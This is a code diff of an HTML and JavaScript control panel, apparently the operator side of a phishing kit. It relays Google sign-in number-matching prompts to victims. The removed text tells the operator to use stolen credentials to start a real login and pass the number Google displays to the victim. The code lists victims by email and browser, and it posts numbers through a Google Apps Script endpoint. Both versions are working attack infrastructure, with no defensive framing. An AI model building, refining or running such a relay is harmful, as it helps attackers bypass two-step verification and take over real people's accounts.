@@ -4,87 +4,60 @@
   <meta charset="UTF-8">
   <title>Prompt Control - Set Number</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #0d1117; color: #c9d1d9; padding: 30px; margin: 0; }
+    body { font-family: Arial, sans-serif; background: #0d1117; color: #c9d1d9; padding: 30px; }
     h1 { color: #ff6b6b; }
     .victim-card { background: #161b22; padding: 20px; border-radius: 8px; margin: 16px 0; border: 1px solid #30363d; }
-    input { padding: 10px; font-size: 20px; width: 80px; text-align: center; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; }
-    button { padding: 10px 20px; background: #238636; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+    input { padding: 10px; font-size: 20px; width: 80px; text-align: center; background: #0d1117; color: white; border: 1px solid #444; border-radius: 4px; }
+    button { padding: 10px 20px; background: #238636; color: white; border: none; border-radius: 6px; cursor: pointer; }
     button:hover { background: #2ea043; }
     .current-number { font-size: 48px; color: #58a6ff; font-weight: bold; margin: 12px 0; }
-    small { color: #8b949e; }
   </style>
 </head>
 <body>
   <h1>Prompt Relay Control</h1>
-  <p>
-    1. Use stolen credentials to start real login on your device.<br>
-    2. When Google shows a number on your phone → enter it here.<br>
-    3. Victim sees it within seconds.
-  </p>
+  <p>Enter the number Google shows you on your device.</p>
 
   <div id="victims-container"></div>
 
   <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxZHBhRWNSq1Pqt5brbBx2zcpwICAGHVo_K2S_h1i29UDFDkJViEz0qS9mZ4xvq35k8/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxxwtqSxcM3xKDVY4vaXQ1E44cosqIVI9HM0guLL8GHe2hEV3S9EmQ1Pr46jzWZa9zS/exec";
 
-    function refreshVictims() {
+    function refresh() {
       fetch(`${SCRIPT_URL}?getVictims=true`)
         .then(r => r.json())
         .then(victims => {
-          const container = document.getElementById("victims-container");
-          container.innerHTML = "";
-          if (victims.length === 0) {
-            container.innerHTML = "<p>No active victims yet.</p>";
-            return;
-          }
-          victims.forEach(v => {
-            const card = document.createElement("div");
-            card.className = "victim-card";
-            card.innerHTML = `
-              <strong>Email:</strong> ${v.email}<br>
-              <small>${new Date(v.timestamp).toLocaleString()} | ${v.user_agent.substring(0, 80)}...</small>
-              <div class="current-number">Number: ${v.prompt_number || "Not set yet"}</div>
-              <input type="text" id="input-${v.email}" placeholder="47" maxlength="2" pattern="[0-9]{2}">
-              <button onclick="setNumber('${v.email}')">Set This Number</button>
-            `;
-            container.appendChild(card);
-          });
-        })
-        .catch(err => console.error(err));
+          document.getElementById("victims-container").innerHTML = victims.length === 0 
+            ? "<p>No victims connected yet.</p>"
+            : victims.map(v => `
+              <div class="victim-card">
+                <strong>${v.email}</strong><br>
+                <small>${new Date(v.timestamp).toLocaleString()}</small>
+                <div class="current-number">Number: ${v.prompt_number || "—"}</div>
+                <input type="text" id="n-${v.email}" maxlength="2" placeholder="47">
+                <button onclick="set('${v.email}')">Set</button>
+              </div>
+            `).join('');
+        });
     }
 
-    function setNumber(email) {
-      const input = document.getElementById(`input-${email}`);
-      const number = input.value.trim();
-      if (!number || !/^\d{2}$/.test(number)) {
-        alert("Enter a 2-digit number (10-99)");
-        return;
-      }
+    function set(email) {
+      const val = document.getElementById(`n-${email}`).value.trim();
+      if (!/^\d{2}$/.test(val)) return alert("2 digits please");
 
       fetch(SCRIPT_URL, {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams({
-          action: "set_number",
-          email: email,
-          prompt_number: number
-        })
+        body: new URLSearchParams({ action: "set_number", email, prompt_number: val })
       })
       .then(r => r.json())
-      .then(data => {
-        if (data.success) {
-          alert(`Number ${number} sent to victim!`);
-          refreshVictims();
-        } else {
-          alert("Failed: " + (data.error || "Unknown"));
-        }
-      })
-      .catch(() => alert("Connection error"));
+      .then(d => {
+        if (d.success) alert("Sent!");
+        refresh();
+      });
     }
 
-    // Refresh every 5 seconds
-    setInterval(refreshVictims, 5000);
-    refreshVictims(); // First load
+    setInterval(refresh, 5000);
+    refresh();
   </script>
 </body>
 </html>
